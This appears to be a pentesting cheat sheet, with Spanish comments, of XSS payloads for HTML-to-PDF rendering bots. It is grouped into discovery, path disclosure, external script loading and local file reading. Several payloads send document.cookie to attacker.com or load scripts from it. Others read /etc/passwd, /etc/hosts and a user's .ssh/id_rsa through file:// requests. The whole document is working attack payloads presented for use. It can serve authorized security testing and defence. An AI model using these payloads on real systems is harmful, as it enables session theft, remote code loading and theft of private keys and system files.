# Local File Read and Exfiltrate Data via XSS from PDFs

```
Discovery:
   <!-- Descubrimiento básico, escribir "1337" -->
   1- <svg/onload=document.write(1337)>
   2- <img src="x" onerror="document.write(1337)" />

   <!-- Descubrimiento ciego básico, carga un recurso -->
   1- <img src="http://attacker.com"/>
   2- <img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
   3- <script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>

Path disclosure:
   <!-- Si el bot accede a una ruta file://, descubrirá la ruta interna si no, al menos tendrá a qué ruta está accediendo el bot -->
   1- <svg/onload=document.write(window.location)>
   2- <img src=x onerror=document.write(window.location)>
   3- <script>document.write(window.location)</script>
   4- <script>document.write(document.location.href)</script>

Load an external script:
   <!-- La mejor forma conforme para aprovechar esta vulnerabilidad es abusar de la vulnerabilidad para hacer que el bot cargue un script que controlas localmente. Luego, podrá cambiar la carga útil localmente y hacer que el bot lo cargue con el mismo código cada vez -->
   1- script src="http://attacker.com/myscripts.js"></script>
   2- <img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>

Read local file:
   1- <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
   2- <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hosts');x.send();</script>
   3- <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
   4- <iframe src=file:///etc/passwd></iframe>
   5- <img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```
